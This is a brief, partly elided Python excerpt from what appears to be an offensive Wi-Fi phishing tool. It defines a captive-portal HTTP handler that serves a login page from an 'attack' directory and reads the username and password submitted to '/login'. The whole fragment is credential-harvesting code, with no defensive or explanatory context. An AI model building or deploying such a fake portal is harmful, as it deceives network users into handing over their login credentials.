...
class CaptivePortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        ...
        # Try to serve index.html from attack directory, fallback to hardcoded
        html_path = "./attack/index.html"
    ...
    def do_POST(self):
        if self.path == '/login':
            ...
            user = fields.get("username", fields.get("user", [""]))[0]
            passwd = fields.get("password", fields.get("pass", [""]))[0]
